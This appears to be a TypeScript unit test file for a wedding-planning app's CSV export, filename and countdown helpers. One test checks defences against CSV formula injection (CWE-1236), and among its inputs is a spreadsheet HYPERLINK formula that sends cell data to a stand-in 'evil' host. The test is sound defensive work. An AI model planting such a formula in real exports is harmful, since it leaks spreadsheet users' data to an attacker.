import { BudgetReport } from '../../core/models/reports';
import { budgetCsv, buildCsv, csvFilename } from './csv';
import { countdownText } from './countdown';

describe('csv', () => {
  it('starts with a UTF-8 BOM and escapes quotes, commas and newlines', () => {
    const out = buildCsv([['a,b', 'say "hi"', 'line1\nline2', 'Zoë', null]]);
    expect(out.charCodeAt(0)).toBe(0xfeff);
    expect(out.slice(1)).toBe('"a,b","say ""hi""","line1\nline2",Zoë,\r\n');
  });

  it('CWE-1236: neutralises formula triggers in text cells only', () => {
    const f = (v: string) => buildCsv([[v]]).slice(1).trimEnd();
    expect(f('=1+1')).toBe("'=1+1");
    expect(f('+x')).toBe("'+x");
    expect(f('-x')).toBe("'-x");
    expect(f('@x')).toBe("'@x");
    expect(f('	x')).toBe("'	x");
    expect(f('=HYPERLINK("http://evil/?"&A2,"x")')).toBe(`"'=HYPERLINK(""http://evil/?""&A2,""x"")"`);
    expect(f('-150.00')).toBe('-150.00');
    expect(f('Anna Smith')).toBe('Anna Smith');
  });

  it('builds the filename from the couple names and date', () => {
    expect(csvFilename('Emma & Daniel', 'guests', '2026-11-25')).toBe('emma-daniel-guests-2026-11-25.csv');
    expect(csvFilename('Zoë & Élan', 'budget', '2026-11-25')).toBe('zoe-elan-budget-2026-11-25.csv');
  });

  it('budget csv has a totals row', () => {
    const r: BudgetReport = {
      totals: { totalBudget: '100.00', committed: '60.00', paid: '10.00', outstanding: '50.00', remaining: '40.00' },
      byCategory: [{ category: 'Venue, main', expenseCount: 2, committed: '60.00', paid: '10.00', outstanding: '50.00', shareOfCommitted: 100 }],
    };
    const lines = budgetCsv(r).trim().split('\r\n');
    expect(lines[1]).toBe('"Venue, main",2,60.00,10.00,50.00,100');
    expect(lines[2]).toBe('Total,2,60.00,10.00,50.00,');
  });

  it('countdown wording', () => {
    expect(countdownText(205)).toBe('in 205 days');
    expect(countdownText(0)).toBe('today');
    expect(countdownText(-3)).toBe('3 days ago');
  });
});
